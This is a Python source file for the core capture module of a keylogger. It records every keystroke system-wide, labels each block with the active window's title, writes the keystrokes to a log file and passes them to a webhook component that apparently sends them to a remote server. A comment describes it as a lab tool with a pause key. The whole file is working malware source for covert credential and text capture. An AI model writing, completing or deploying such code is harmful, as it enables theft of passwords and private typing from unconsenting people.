import threading
from datetime import datetime
from pynput import keyboard
from .config import TOGGLE_KEY
from .writer  import LogWriter
from .window  import WindowTracker
from .webhook import WebhookDelivery


# Human-readable labels for non-printable keys.
# pynput gives us Key.space, Key.enter etc. — we map them to readable tokens
# so the log is easy to read back without decoding raw scan codes.
SPECIAL_KEYS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "[ENTER]\n",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.shift:     "",       # modifiers produce no visible output
    keyboard.Key.shift_r:   "",
    keyboard.Key.ctrl_l:    "[CTRL]",
    keyboard.Key.ctrl_r:    "[CTRL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.alt_r:     "[ALT]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.esc:       "[ESC]",
    keyboard.Key.up:        "[UP]",
    keyboard.Key.down:      "[DOWN]",
    keyboard.Key.left:      "[LEFT]",
    keyboard.Key.right:     "[RIGHT]",
}


class KeyCapture:
    """
    Listens to keyboard events using pynput and routes them to the writer.

    F9 toggle design:
    The toggle lets you pause/resume capture without stopping the process.
    This is useful during a lab session when you want to type credentials
    into your own terminal without logging them — you pause, type, resume.

    Thread safety:
    pynput calls on_press() and on_release() from its own internal thread.
    All shared state (_recording, _writer) is accessed under _lock.
    """

    def __init__(self):
        self._writer   = LogWriter()
        self._webhook  = WebhookDelivery()
        self._tracker  = WindowTracker(on_change_callback=self._on_window_change)
        self._lock     = threading.Lock()
        self._recording = True     # starts in recording state
        self._listener  = None     # pynput Listener (set in start())

    def start(self):
        """Start all subsystems and block until the listener stops."""
        self._writer.start()
        self._tracker.start()

        # Log a session start marker with a timestamp so log files are
        # easy to grep for session boundaries.
        self._writer.write(
            f"\n--- Session started {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        )

        # pynput.keyboard.Listener runs in its own thread.
        # Calling .join() on it blocks the calling thread (our main thread)
        # until the listener is stopped — giving us a clean blocking main loop.
        self._listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        )
        with self._listener:
            self._listener.join()   # blocks here until stop() is called

    def stop(self):
        """Cleanly shut down all subsystems."""
        if self._listener:
            self._listener.stop()

        self._writer.write(
            f"\n--- Session ended {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        )
        self._webhook.flush()
        self._writer.stop()
        self._tracker.stop()

    def _on_window_change(self, title: str):
        """
        Called by WindowTracker when the focused window changes.
        Writes a context marker to the log so you can see which application
        each block of keystrokes was typed into.
        """
        with self._lock:
            if self._recording:
                ts = datetime.now().strftime("%H:%M:%S")
                self._writer.write(f"\n[{ts}] [{title}]\n")

    def _on_press(self, key):
        """
        pynput callback — fires for every key press.
        Runs in pynput's listener thread.
        """
        # Check for toggle key BEFORE the recording guard —
        # the toggle must work whether we are currently recording or not.
        if self._is_toggle(key):
            with self._lock:
                self._recording = not self._recording
                state = "RESUMED" if self._recording else "PAUSED"
            # Write directly (bypassing recording guard) so the log always
            # has a record of toggle events.
            ts = datetime.now().strftime("%H:%M:%S")
            self._writer.write(f"\n[{ts}] [CAPTURE {state}]\n")
            return

        with self._lock:
            if not self._recording:
                return  # silently drop keystrokes while paused

        # Resolve the key to a printable string
        text = self._key_to_str(key)
        if text:
            self._writer.write(text)
            self._webhook.feed(text)

    def _on_release(self, key):
        """
        pynput callback — fires when a key is released.
        We don't log key-up events (too noisy), but we need this
        method to satisfy pynput's interface.
        """
        pass    # intentionally empty

    def _is_toggle(self, key) -> bool:
        """Check whether the pressed key matches the configured TOGGLE_KEY."""
        try:
            # Function keys (F9, F10, ...) are keyboard.Key enum members
            return key == keyboard.Key[TOGGLE_KEY]
        except KeyError:
            # TOGGLE_KEY might be a character key ('p', 'q', etc.)
            try:
                return key.char == TOGGLE_KEY
            except AttributeError:
                return False

    def _key_to_str(self, key) -> str:
        """
        Convert a pynput key object to a human-readable string.

        pynput gives us two types of key objects:
          - keyboard.Key members (special keys: enter, space, F1-F12, etc.)
          - keyboard.KeyCode objects with a .char attribute (printable characters)

        We look up special keys in SPECIAL_KEYS first, then fall back to .char.
        """
        # Special key (enter, backspace, arrow keys, etc.)
        if key in SPECIAL_KEYS:
            return SPECIAL_KEYS[key]

        # Function keys and other named keys not in our map — log their name
        if isinstance(key, keyboard.Key):
            return f"[{key.name.upper()}]"

        # Regular printable character
        try:
            return key.char if key.char else ""
        except AttributeError:
            return ""
